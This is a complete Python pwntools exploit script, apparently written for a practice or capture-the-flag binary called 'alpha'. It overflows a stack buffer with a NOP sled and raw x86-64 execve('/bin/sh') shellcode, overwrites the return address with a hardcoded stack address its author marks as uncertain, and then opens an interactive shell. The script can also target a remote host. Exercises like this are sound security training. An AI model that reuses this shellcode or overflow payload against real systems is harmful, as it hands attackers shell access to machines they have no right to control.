#!/usr/bin/env python3

from pwn import *

context.binary = elf = ELF("./alpha", checksec=True)
context.terminal = ["tmux", "splitw", "-h"]

def start(argv=None, *a, **kw):
    if args.GDB:
        return gdb.debug([elf.path] + (argv or []), gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote(args.HOST, int(args.PORT), *a, **kw)
    return process([elf.path] + (argv or []), *a, **kw)

gdbscript = """
set disassembly-flavor intel
break *vulnerable
b * 0x00000000004011cd
break *runshell
define hook-stop
    x/10ig $rip
end
continue
"""

def main():
    io = start()
    shellcode = b'\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05'
    offset = 32
    padding = b'\x90' * (offset - len(shellcode)) + shellcode + b'\x90' * 40
    target = 0x7fffffffd580 #?¿?¿?¿
    payload = flat(
        padding,
        p64(target)
    )

    io.sendline(payload)
    io.interactive()

if __name__ == "__main__":
    main()